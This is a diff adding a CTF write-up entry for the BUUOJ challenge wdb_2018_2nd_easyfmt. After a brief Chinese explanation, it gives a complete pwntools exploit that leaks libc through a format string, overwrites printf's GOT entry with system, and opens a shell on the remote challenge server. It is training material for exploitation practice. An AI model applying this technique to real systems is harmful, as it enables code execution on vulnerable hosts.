@@ -1281,4 +1281,59 @@ if __name__ == "__main__":
 
 ```
 
+### wdb_2018_2nd_easyfmt
 
+[题目链接](https://buuoj.cn/challenges#wdb_2018_2nd_easyfmt)
+
+就像它的名字，fmt + GOT 表覆写攻击。
+
+不知道为什么，反正泄露 printf 的时候，枚举了好几次垃圾字符位移都不对。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+ 
+host = "node5.buuoj.cn"
+port = 27942
+io = remote(host,port)
+# io = process("./wdb_2018_2nd_easyfmt")
+elf = ELF("./wdb_2018_2nd_easyfmt")
+libc = ELF("./libc-2.23.so")
+puts_got = elf.got['puts']
+printf_got = elf.got['printf']
+
+def main():
+    io.recvuntil(b"Do you know repeater?\n")
+    payload_0 = p32(printf_got) + b"%6$s"
+    io.sendline(payload_0)
+    sleep(0.1)
+    leak_data = io.recvuntil('\xf7')[-4:]
+    # print("DEBUG [*] leak data is :",leak_data)
+    # gdb.attach(io)
+    # leak_data = io.recvn(4)
+    printf_addr = u32(leak_data)
+    print("\n[+] Leak printf address :",hex(printf_addr))
+    libc_base = printf_addr - libc.sym['printf']
+    print("\n[+] Leak libc base address :",hex(libc_base))
+    system = libc_base + libc.sym['system']
+    print("\n[+] Leak system address :",hex(system))
+    payload_1 = fmtstr_payload(6,{printf_got:system},write_size="byte",numbwritten=0)
+    io.sendline(payload_1)
+    sleep(0.1)
+    # gdb.attach(io)
+    io.sendline(b"cat flag")
+    io.interactive()
+
+
+if __name__ == "__main__":
+    main()
+
+# 0x3a80c
+# 0x3a80e
+# 0x3a812
+# 0x3a819
+# 0x5f065
+# 0x5f066
+```
